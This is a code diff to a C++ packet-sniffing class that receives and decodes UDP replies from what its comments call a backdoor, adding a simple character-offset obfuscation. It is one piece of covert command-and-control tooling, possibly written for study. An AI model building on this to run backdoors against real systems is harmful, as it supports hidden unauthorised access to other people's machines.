@@ -12,22 +12,25 @@
 
 NetworkMonitor * NetworkMonitor::instance = nullptr;
 
-NetworkMonitor::NetworkMonitor()
+NetworkMonitor::NetworkMonitor(int cypherOffset)
 {
+    this->cypherOffset = cypherOffset;
     this->listenInterface = nullptr;
     this->currentFD = nullptr;
     this->data = nullptr;
 }
 
-NetworkMonitor * NetworkMonitor::getInstance()
+NetworkMonitor * NetworkMonitor::getInstance(int cypherOffset)
 {
     if(NetworkMonitor::instance == nullptr){
-        NetworkMonitor::instance = new NetworkMonitor();
+        NetworkMonitor::instance = new NetworkMonitor(cypherOffset);
     }
     return NetworkMonitor::instance;
 }
 
-
+/**
+ * This will await the response of the backdoor
+ */
 std::string NetworkMonitor::getResponse()
 {
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -65,10 +68,20 @@ std::string NetworkMonitor::getResponse()
     if(this->data == nullptr){
         return this->data->c_str();
     }else{
-        return (*this->data);
+        std::string data = this->data->c_str();
+        std::string encryptedPayload;
+        for(unsigned int i = 0; i < data.length(); i++)
+        {
+            char c = data[i];
+            encryptedPayload += (c - (this->cypherOffset));
+        }
+        return encryptedPayload;
     }
 }
 
+/**
+ * This will get the pcap listen interfaces
+ */
 bool NetworkMonitor::getInterface()
 {
     Logger::debug("Main:getInterfaces - Initializing");
@@ -101,6 +114,9 @@ bool NetworkMonitor::getInterface()
     return false; //This will happen if the right interface can never be found
 }
 
+/**
+ * This will process the reply and break down the packet into the response.
+ */
 void NetworkMonitor::processPayload(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet)
 {
     Logger::debug("Packet received");
@@ -117,8 +133,9 @@ void NetworkMonitor::processPayload(u_char *ptrnull, const struct pcap_pkthdr *p
     short destinationPort = ntohs(udp->uh_dport);
     Logger::debug("Dst port:" + destinationPort);
 
+
     //if our packet. parse what we know out of it
-//    printf("%s\n", payload);
+    //    printf("%s\n", payload);
 
     NetworkMonitor::instance->data = new string((char *)payload);
     NetworkMonitor::instance->killListening();
